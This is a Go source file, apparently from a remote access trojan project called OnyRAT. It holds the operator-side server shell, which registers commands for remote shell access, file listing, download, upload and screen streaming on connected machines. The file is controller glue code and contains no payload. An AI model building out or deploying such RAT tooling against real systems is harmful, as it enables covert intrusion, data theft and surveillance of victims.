//go:build server
// +build server

package commands

import (
	"context"
	"errors"
	"fmt"
	"os"

	handlers "github.com/Onyz107/onyrat/internal/commands/server"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/abiosoft/ishell"
)

func (ch *CommandHandler) RunServer() {
	inCtx, cancel := context.WithCancelCause(ch.Ctx)
	ch.cancel = cancel
	defer func() {
		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
			ch.done <- fmt.Errorf("failed to run server: %w", err)
		} else {
			ch.done <- nil
		}
	}()
	defer cancel(nil)

	server, ok := ch.Communicator.(*network.KCPServer)
	if !ok {
		cancel(fmt.Errorf("invalid server"))
		return
	}

	shell := ishell.New()
	shell.Println("Welcome to OnyRAT 1.0\nType 'help' to see available commands.\n")

	shell.Interrupt(func(c *ishell.Context, count int, input string) {
		if count < 2 {
			c.Println("Press Ctrl+C again to exit.")
			c.Println("Please note that this will terminate any ongoing background processes immediately.\n")
			c.Println("Type 'exit' to exit gracefully.\n")
			return
		}
		os.Exit(1)
	})

	shell.SetPrompt(fmt.Sprintf("(\033[1mOnyRAT\033[0m@%s) # ", server.Listener.Addr().String()))

	handlers.RegisterShellCommand(server, shell)
	handlers.RegisterShowCommand(server, shell)
	handlers.RegisterDisconnectCommand(server, shell)
	handlers.RegisterListFilesCommand(server, shell)
	handlers.RegisterDownloadCommand(server, shell, inCtx)
	handlers.RegisterUploadCommand(server, shell, inCtx)
	handlers.RegisterScreenStreamCommand(server, shell, inCtx)

	shell.Start()
	defer shell.Close()

	go func() {
		shell.Wait()
		cancel(nil)
	}()

	<-inCtx.Done()
}

func (ch *CommandHandler) StartServer() {
	if ch.done == nil {
		ch.done = make(chan error, 1)
	}
	go ch.RunServer()
}

func (ch *CommandHandler) WaitServer() error {
	if ch.done != nil {
		return <-ch.done
	}
	return fmt.Errorf("server command handler not initialized")
}

func (ch *CommandHandler) StopServer() {
	if ch.cancel != nil {
		ch.cancel(fmt.Errorf("stopped by user"))
	}
	ch.cancel = nil // Make nil so we do not error if Stop is called again after being initilized for only once
}
